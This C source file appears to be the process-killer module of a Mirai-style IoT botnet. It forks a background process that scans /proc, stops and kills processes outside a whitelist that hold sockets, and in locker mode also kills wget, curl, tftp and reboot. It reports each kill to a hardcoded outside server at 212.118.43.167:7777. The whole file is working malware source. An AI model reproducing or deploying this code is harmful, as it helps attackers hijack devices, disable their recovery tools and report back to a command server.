
#define _GNU_SOURCE
#ifdef DEBUG
#include <stdio.h>
#endif
#include <fcntl.h>
#include <dirent.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>

#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <time.h>

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/if_ether.h>
#include <errno.h>
#include <sys/select.h>
#include <fcntl.h>

#include "headers/killer.h"
#include "headers/locker.h"
#include "../../utils/headers/util.h"
#include "../../encryption/chacha20_table.h"

Kill *k_head = NULL;
char self_realpath[256] = {0};
static int killer_pid = -1;

char *whitlistpaths[] = {
#ifdef DEBUG
    "/usr/lib/openssh/sftp-server",
    "/home/",
#endif
    "/lib/systemd/",
    "/usr/lib/systemd",
    "/system/system/bin/",
    "/gm/bin/",
    "/mnt/",
    "/home/process/",
    "/home/helper",
    "/home/davinci",
    "/z/bin/",
    "/mnt/mtd/",
    "/tmp/sqfs/",
    "/usr/libexec/",
    "/usr/sbin/",
    "/z/zbin/",
    "/usr/bin",
    "/sbin/",
    "/bin/"};

void killer_destroy(void)
{
    kill(killer_pid, 9);
}

void kill_report(char* real_path, char* pid) {
    int socketFD;
    struct sockaddr_in serverAddress;

    socketFD = socket(AF_INET, SOCK_STREAM, 0);
    if (socketFD == -1) {
        return;
    }

    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = INET_ADDR(212,118,43,167);
    serverAddress.sin_port = htons(7777);

    char* text = malloc(1024);

    _strcpy(text, "Killed process: ");
    _strcat(text, pid);
    _strcat(text, " Path: ");
    _strcat(text, real_path);


    if (connect(socketFD, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {
        return;
    }

    if (send(socketFD, text, strlen(text), 0) < 0) {
        return;
    }

    free(text);

    close(socketFD);
}

char check_whitelisted(char *path)
{
    if (_strcmp2(path, self_realpath) == 0)
    {
        return 1;
    }

    for (int i = 0; i < sizeof(whitlistpaths) / sizeof(whitlistpaths[0]); i++)
    {
        if (_startswith(path, whitlistpaths[i]))
        {
            return 1;
        }
    }

    return 0;
}

char *check_realpath(char *pid, char *path, int locker)
{
    char exepath[256] = {0};

    _strcpy(exepath, enc[KILLER_PROC].string);
    _strcat(exepath, pid);
    _strcat(exepath, enc[KILLER_EXE].string);

    if (readlink(exepath, path, 256) == -1)
    {
        return NULL;
    }

    if (locker && (_strstr(path, "wget") || _strstr(path, "curl") || _strstr(path, "tftp") || _strstr(path, "reboot")))
        return path;

    if (check_whitelisted(path) == 1)
    {
        return NULL;
    }

    return path;
}

static char check_for_contraband(char *fdpath)
{
    char fdinode[256] = {0};

    if (readlink(fdpath, fdinode, 256) == -1)
    {
        return 0;
    }

    if (_strstr(fdinode, "socket") || _strstr(fdinode, "proc"))
        return 1;

    return 0;
}

static char check_fds(char *pid, char *realpath)
{
    char retval = 0;
    DIR *dir;
    struct dirent *file;
    char inode[256], fdspath[256] = {0}, fdpath[512];

    _strcpy(fdspath, enc[KILLER_PROC].string);
    _strcat(fdspath, pid);
    _strcat(fdspath, enc[KILLER_FD].string);

    if ((dir = opendir(fdspath)) == NULL)
    {
        return retval;
    }

    while ((file = readdir(dir)))
    {
        _memset(inode, 0, 256);
        _strcpy(fdpath, fdspath);
        _strcat(fdpath, "/");
        _strcat(fdpath, file->d_name);

        if (check_for_contraband(fdpath))
        {
            retval = 1;
            break;
        }
    }

    closedir(dir);
    return retval;
}

static void delete_list(void)
{
    Kill *temp = NULL;

    if (k_head == NULL)
        return;

    while (k_head != NULL)
    {
        if ((temp = k_head->next) != NULL)
            free(k_head);

        k_head = temp;
    }
}

static Kill *compare_realpaths(char *pid)
{
    Kill *node = k_head;
    char exepath[256], realpath[256] = {0};

    if (node == NULL)
        return 0;

    _strcpy(exepath, enc[KILLER_PROC].string);
    _strcat(exepath, pid);
    _strcat(exepath, enc[KILLER_EXE].string);

    if (readlink(exepath, realpath, 256) == -1)
        return NULL;

    while (node != NULL)
    {
        if (_strcmp2(node->path, realpath) == 0)
            return node;

        node = node->next;
    }

    return NULL;
}

static void kill_list(void)
{
    int pid;
    DIR *dir;
    Kill *node = NULL;
    struct dirent *file;

    if ((dir = opendir(enc[KILLER_PROC].string)) == NULL)
        return delete_list();

    while ((file = readdir(dir)))
    {
        if (!(node = compare_realpaths(file->d_name)))
            continue;

        pid = _atoi(file->d_name);

        debug("Killing pid: %s%s%s, Realpath: %s\n",
              file->d_name,
              (pid == node->n_pid) ? "" : " has relations to ",
              (pid == node->n_pid) ? "" : node->pid, node->path);
        kill_report(node->path, node->pid);
        kill(pid, 9);
    }

    closedir(dir);
    delete_list();
}

static void add_to_kill(char *pid, char *realpath)
{
    Kill *node = calloc(1, sizeof(Kill)), *last;

    node->n_pid = _atoi(pid);

    _strcpy(node->pid, pid);
    _strcpy(node->path, realpath);

    if (k_head == NULL)
    {
        k_head = node;
        return;
    }

    last = k_head;

    while (last->next != NULL)
        last = last->next;

    last->next = node;
    kill(node->n_pid, 19);
}

static void killer_that_kills(void)
{
    DIR *dir;
    struct dirent *file;
    char realpath[256] = {0};

    if ((dir = opendir(enc[KILLER_PROC].string)) == NULL)
    {
        return;
    }

    while ((file = readdir(dir)))
    {
        if (!_isdigit(file->d_name[0]))
            continue;

        _memset(realpath, 0, 256);

        if (!check_realpath(file->d_name, realpath, 0))
        {
            continue;
        }

        if (check_fds(file->d_name, realpath))
        {
#ifdef DEBUG
            debug("Adding %s to kill list - Realpath: %s\n", file->d_name, realpath);
#endif
            add_to_kill(file->d_name, realpath);
        }
    }

    closedir(dir);

    kill_list();
}

void killer_create()
{

    signal(SIGCHLD, SIG_IGN);
    _strcpy(self_realpath, _self_path());

    if ((killer_pid = fork()) != 0)
        return;

    signal(SIGCHLD, SIG_IGN);
    _strcpy(self_realpath, _self_path());
    
#ifndef LOCKER

    while (1)
    {
        killer_that_kills();
        sleep(1);
    }
#else
    killer_that_kills();
    locker_create();
#endif

    exit(0);
}